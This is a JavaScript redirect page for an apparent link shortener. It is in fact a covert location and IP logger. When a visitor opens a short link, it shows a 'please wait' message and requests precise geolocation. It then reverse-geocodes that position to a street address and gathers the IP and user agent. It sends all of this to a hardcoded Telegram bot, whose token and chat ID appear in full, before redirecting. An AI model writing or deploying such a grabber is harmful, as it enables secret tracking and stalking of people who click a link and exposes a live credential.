const BOT_TOKEN = "7883114175:AAHoSytNEqiKJoOWlAEokmviHOl9dJ32zI0";
const CHAT_ID = "1598127418";

// Ambil kode short dari path URL
const shortCode = window.location.pathname.split("/").pop();

// Function to get more detailed location info
async function getLocationDetails(lat, lon) {
  try {
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
    const data = await response.json();
    return data.display_name || "Unknown location";
  } catch (error) {
    console.error("Error fetching location details:", error);
    return "Location details unavailable";
  }
}

async function sendLogAndRedirect(url) {
  // Try to get precise location with high accuracy
  const geoOptions = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
  };

  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
    });
    
    // Get detailed location info
    const locationDetails = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
    
    // Format location data with more details
    const msg = `📍 *Visitor Location Detected*\n` +
      `🌍 Coordinates: ${pos.coords.latitude}, ${pos.coords.longitude}\n` +
      `📌 Accuracy: ±${pos.coords.accuracy}m\n` +
      `📍 Address: ${locationDetails}\n` +
      `🧭 Heading: ${pos.coords.heading || "N/A"}\n` +
      `🔋 Device Info: ${navigator.userAgent}\n` +
      `🌐 IP: ${await getIP()}\n` +
      `🕒 Time: ${new Date().toLocaleString()}\n` +
      `🔗 Short Code: ${shortCode}`;
    
    sendToTelegram(msg, url);
  } catch (error) {
    // Fallback if location permission denied or error
    const msg = `📍 *Visitor (No Location Permission)*\n` +
      `❌ Location access: Denied or unavailable\n` +
      `📱 Device Info: ${navigator.userAgent}\n` +
      `🌐 IP: ${await getIP()}\n` +
      `🕒 Time: ${new Date().toLocaleString()}\n` +
      `🔗 Short Code: ${shortCode}`;
    
    sendToTelegram(msg, url);
  }
}

// Get user IP address using a public API
async function getIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return "Unable to get IP";
  }
}

function sendToTelegram(message, redirectUrl) {
  const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  fetch(apiUrl, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ 
      chat_id: CHAT_ID, 
      text: message, 
      parse_mode: "Markdown",
      disable_web_page_preview: true
    })
  }).finally(() => {
    console.log("Redirecting to:", redirectUrl);
    window.location.href = redirectUrl;
  });
}

// Show loading message while getting location
document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h3>Please wait while we process your request...</h3><p>You will be redirected shortly.</p></div>";

// Ambil database tujuan dari file
fetch("data.json")
  .then(res => res.json())
  .then(data => {
    const url = data[shortCode];
    if (url) {
      sendLogAndRedirect(url);
    } else {
      document.body.innerHTML = "<h2>Link tidak ditemukan.</h2>";
    }
  })
  .catch(error => {
    console.error("Error fetching data.json:", error);
    document.body.innerHTML = "<h2>Error loading page. Please try again later.</h2>";
  });
